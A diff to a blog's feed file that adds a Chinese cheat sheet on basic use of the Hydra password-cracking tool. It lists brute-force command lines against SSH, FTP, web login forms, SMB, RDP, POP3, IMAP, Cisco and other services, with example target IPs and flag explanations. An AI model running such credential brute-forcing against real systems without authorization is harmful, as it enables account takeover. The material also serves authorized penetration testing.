@@ -23,13 +23,19 @@
     
     
     <entry>
-      <title>python学习</title>
-      <link href="/2019/09/25/python-xue-xi/"/>
-      <url>/2019/09/25/python-xue-xi/</url>
+      <title>Hydra的基本用法</title>
+      <link href="/2019/09/25/hydra/"/>
+      <url>/2019/09/25/hydra/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>1、破解ssh：<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh<br>hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh</p><p>2、破解ftp：<br>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra 120.27.50.146 ftp -l root -P pass.txt -t 16 -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p><p>3、get方式提交，破解web登录：<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</p><p>4、post方式提交，破解web登录：<br>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password”<br>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“<br>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）</title></p><p>5、破解https：<br>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</p><p>6、破解teamspeak：<br>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</p><p>7、破解cisco：<br>hydra -P pass.txt 10.36.16.18 cisco<br>hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</p><p>8、破解smb：<br>hydra -l administrator -P pass.txt 10.36.16.18 smb</p><p>9、破解pop3：<br>hydra -l muts -P pass.txt my.pop3.mail pop3</p><p>10、破解rdp（破解3389端口）：<br>hydra ip rdp -l administrator -P pass.txt -V<br>eg:<br>其中命令：hydra 192.168.1.12 rdp -L users.txt -P pass.txt -V<br>192.168.12是目标服务器的IP地址<br>rdp 是协议</p><p>-L 指定一个帐号字典<br>-P 指定一个密码字典<br>-V 现实爆破测试的详细过程</p><p>11、破解http-proxy：<br>hydra -l admin -P pass.txt http-proxy://10.36.16.18</p><p>12、破解imap：<br>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 安全工具使用 </tag>
+            
+        </tags>
       
     </entry>
     
